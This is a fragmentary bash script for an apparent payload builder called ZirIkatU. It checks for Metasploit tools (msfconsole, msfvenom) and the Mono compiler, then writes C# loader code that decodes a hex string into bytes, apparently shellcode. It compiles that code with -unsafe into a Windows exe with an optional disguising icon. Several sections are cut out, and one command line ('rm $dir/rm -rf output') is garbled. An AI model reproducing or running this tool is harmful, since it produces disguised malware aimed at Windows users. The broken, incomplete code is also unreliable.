...
echo -e '\e[0;31m【!!】 This script need root permission' 1>&2
exit
fi
dir=`pwd`
rm $dir/rm -rf output
...
if [ "$msfconsole" == "1" ] && [ "$msfvenom" == "1" ] && [ "$mono" == "1" ] && [ "$mcs" == "1" ] && [ "$postgresql" == "1" ]; then
...
if [ "$msfconsole" == "0" ] || [ "$msfvenom" == "0" ] || [ "$mono" == "0" ] || [ "$mcs" == "0" ] || [ "$postgresql" == "0" ]; then 
fail='1'
echo -en "\b【\e[0;31mFail\e[0m】"
echo ""
echo ""
fi
...
echo "public static byte[] HexStringToByteArray(String Hex)" >> Kodea
echo "{ int KaraktereZenb = Hex.Length;" >> Kodea
echo "byte[] bytes = new byte[KaraktereZenb / 2];" >> Kodea
echo "for (int zenbakia = 0; zenbakia < KaraktereZenb; zenbakia += 2)" >> Kodea
echo "bytes[zenbakia / 2] = Convert.ToByte(Hex.Substring(zenbakia, 2), 16);" >> Kodea
echo "return bytes; }" >> Kodea
...
mcs -platform:x86 -unsafe Kodea -win32icon:$dir/zirikatu.ico -out:$dir/output/ZirIkatU.exe
elif [ "$icon" == "n" ] && [ "$error" == "y" ]; then
mcs -platform:x86 -unsafe Kodea -reference:System.Windows.Forms -out:$dir/output/ZirIkatU.exe
elif [ "$icon" == "n" ] && [ "$error" == "n" ]; then
mcs -platform:x86 -unsafe Kodea -out:$dir/output/ZirIkatU.exe
elif [ "$icon" == "y" ] && [ "$error" == "y" ]; then
mcs -platform:x86 -unsafe Kodea -win32icon:$dir/zirikatu.ico -reference:System.Windows.Forms -out:$dir/output/ZirIkatU.exe
fi
mv $dir/output/ZirIkatU.exe $dir/output/$izena.exe
sleep 1
echo ""
